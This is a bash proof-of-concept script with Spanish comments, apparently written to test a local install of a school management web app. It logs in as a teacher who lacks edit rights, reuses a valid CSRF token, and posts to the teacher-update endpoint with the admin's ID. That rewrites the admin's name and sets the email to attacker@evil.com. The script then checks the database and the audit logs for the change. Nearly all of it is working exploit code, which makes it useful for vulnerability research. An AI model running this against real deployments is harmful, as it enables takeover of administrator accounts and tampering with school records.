#!/usr/bin/env bash
set -u
D=/opt/homebrew/bin/docker
B=http://localhost:8080
CJ=/tmp/mal.txt
rm -f "$CJ"

extract_token() { python3 -c "import sys,re; m=re.search(r'name=\"_token\"\s+value=\"([^\"]+)\"', sys.stdin.read()); print(m.group(1) if m else '')"; }
sq() { $D exec db mysql -uunifiedtransform -psecret unifiedtransform -N -e "$1" 2>/dev/null; }

echo "===== ADMIN ANTES ====="
sq "SELECT id,email,first_name,last_name,role FROM users WHERE id=1;"

echo "===== login Mallory (docente, SIN 'edit users') ====="
T=$(curl -s -c "$CJ" "$B/login" | extract_token)
echo "login token len: ${#T}"
curl -s -b "$CJ" -c "$CJ" -o /dev/null -w "POST /login -> %{http_code}\n" \
  -d "_token=$T" --data-urlencode "email=mallory@ut.com" --data-urlencode "password=password123" "$B/login"

echo "===== token CSRF valido de sesion (desde el form propio de Mallory, id=3) ====="
curl -s -b "$CJ" -o /tmp/edit3.html -w "GET edit/3 -> %{http_code}\n" "$B/teachers/edit/3"
ETOK=$(cat /tmp/edit3.html | extract_token)
echo "edit token len: ${#ETOK}"

echo "===== EXPLOIT: POST /school/teacher/update teacher_id=1 ====="
curl -s -b "$CJ" -o /dev/null -w "POST update -> %{http_code}\n" \
  -d "_token=$ETOK" -d "teacher_id=1" \
  --data-urlencode "first_name=PWNED" --data-urlencode "last_name=ByMallory" \
  --data-urlencode "email=attacker@evil.com" \
  --data-urlencode "gender=male" --data-urlencode "nationality=NA" \
  --data-urlencode "phone=0" --data-urlencode "address=x" --data-urlencode "address2=" \
  --data-urlencode "city=x" --data-urlencode "zip=0" \
  "$B/school/teacher/update"

echo "===== ADMIN DESPUES ====="
sq "SELECT id,email,first_name,last_name,role FROM users WHERE id=1;"

echo "===== AUDITORIA: hay model.updated para el User id=1? ====="
sq "SELECT id,event,auditable_type,auditable_id,actor_email FROM audit_logs WHERE auditable_type LIKE '%User%' AND auditable_id=1;"
echo "(conteo model.updated en toda la tabla:)"
sq "SELECT COUNT(*) FROM audit_logs WHERE event='model.updated';"
